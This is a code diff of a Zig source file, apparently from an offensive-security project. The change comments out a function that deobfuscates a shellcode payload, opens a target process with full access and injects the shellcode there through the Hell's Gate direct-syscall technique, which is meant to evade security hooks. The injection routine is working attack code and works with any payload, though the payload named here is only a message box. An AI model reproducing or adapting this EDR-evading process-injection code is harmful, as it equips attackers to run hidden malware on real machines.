@@ -109,73 +109,73 @@ fn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !
     return error.ProcessNotFound;
 }
 
-// Simple test function without MessageBox
-fn simpleTestFunction() callconv(.C) u32 {
-    std.debug.print("[TEST] Function executed in 64-bit mode!\n", .{});
-
-    // Do some calculations to verify execution
-    var sum: u32 = 0;
-    var i: u32 = 1;
-    while (i <= 100) : (i += 1) {
-        sum += i;
-    }
-
-    std.debug.print("[TEST] Sum of 1-100: {d} (should be 5050)\n", .{sum});
-    std.debug.print("[TEST] Function completed successfully!\n", .{});
-
-    return 0x12345678; // Return a recognizable value
-}
-
-fn runX64ShellcodeByHellsGate() !void {
-    // -----------------------------------------
-    // Init shellcode
-    // -----------------------------------------
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
-    defer _ = gpa.deinit();
-    const allocator = gpa.allocator();
-
-    const shellcode = try payloads.macDeobfuscation(&payloads.msgbox, allocator);
-
-    var hell_success = false;
-
-    // -----------------------------------------
-    // Init vx_table for Hell's Gate
-    // -----------------------------------------
-    var vx_table = hell.init_vx_table() orelse {
-        std.debug.print("[-] Failed to initialize Hell's Gate VX table\n", .{});
-        return;
-    };
-
-    // -----------------------------------------
-    // Get the target process ID
-    // -----------------------------------------
-    const target_pid = getRemoteProcessPid(allocator, target_process_name) catch |err| {
-        switch (err) {
-            error.ProcessNotFound => {
-                std.debug.print("[-] Target process '{s}' not found\n", .{target_process_name});
-                return;
-            },
-            else => return err,
-        }
-    };
-
-    // -----------------------------------------
-    // Get the target process handle
-    // -----------------------------------------
-    const target_process_handle = OpenProcess(hell.PROCESS_ALL_ACCESS, FALSE, target_pid) orelse {
-        std.debug.print("[-] Failed to open target process\n", .{});
-        return;
-    };
-    defer _ = CloseHandle(target_process_handle);
-
-    // -----------------------------------------
-    // Inject the shellcode by Hell's Gate
-    // -----------------------------------------
-    _ = hell.init();
-    hell_success = hell.hellsGateInject(&vx_table, target_process_handle, shellcode.ptr, shellcode.len);
-
-    std.debug.print("[*] Hell's Gate injection result: {}\n", .{hell_success});
-}
+// // Simple test function without MessageBox
+// fn simpleTestFunction() callconv(.C) u32 {
+//     std.debug.print("[TEST] Function executed in 64-bit mode!\n", .{});
+//
+//     // Do some calculations to verify execution
+//     var sum: u32 = 0;
+//     var i: u32 = 1;
+//     while (i <= 100) : (i += 1) {
+//         sum += i;
+//     }
+//
+//     std.debug.print("[TEST] Sum of 1-100: {d} (should be 5050)\n", .{sum});
+//     std.debug.print("[TEST] Function completed successfully!\n", .{});
+//
+//     return 0x12345678; // Return a recognizable value
+// }
+//
+// fn runX64ShellcodeByHellsGate() !void {
+//     // -----------------------------------------
+//     // Init shellcode
+//     // -----------------------------------------
+//     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+//     defer _ = gpa.deinit();
+//     const allocator = gpa.allocator();
+//
+//     const shellcode = try payloads.macDeobfuscation(&payloads.msgbox, allocator);
+//
+//     var hell_success = false;
+//
+//     // -----------------------------------------
+//     // Init vx_table for Hell's Gate
+//     // -----------------------------------------
+//     var vx_table = hell.init_vx_table() orelse {
+//         std.debug.print("[-] Failed to initialize Hell's Gate VX table\n", .{});
+//         return;
+//     };
+//
+//     // -----------------------------------------
+//     // Get the target process ID
+//     // -----------------------------------------
+//     const target_pid = getRemoteProcessPid(allocator, target_process_name) catch |err| {
+//         switch (err) {
+//             error.ProcessNotFound => {
+//                 std.debug.print("[-] Target process '{s}' not found\n", .{target_process_name});
+//                 return;
+//             },
+//             else => return err,
+//         }
+//     };
+//
+//     // -----------------------------------------
+//     // Get the target process handle
+//     // -----------------------------------------
+//     const target_process_handle = OpenProcess(hell.PROCESS_ALL_ACCESS, FALSE, target_pid) orelse {
+//         std.debug.print("[-] Failed to open target process\n", .{});
+//         return;
+//     };
+//     defer _ = CloseHandle(target_process_handle);
+//
+//     // -----------------------------------------
+//     // Inject the shellcode by Hell's Gate
+//     // -----------------------------------------
+//     _ = hell.init();
+//     hell_success = hell.hellsGateInject(&vx_table, target_process_handle, shellcode.ptr, shellcode.len);
+//
+//     std.debug.print("[*] Hell's Gate injection result: {}\n", .{hell_success});
+// }
 
 pub fn main() !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
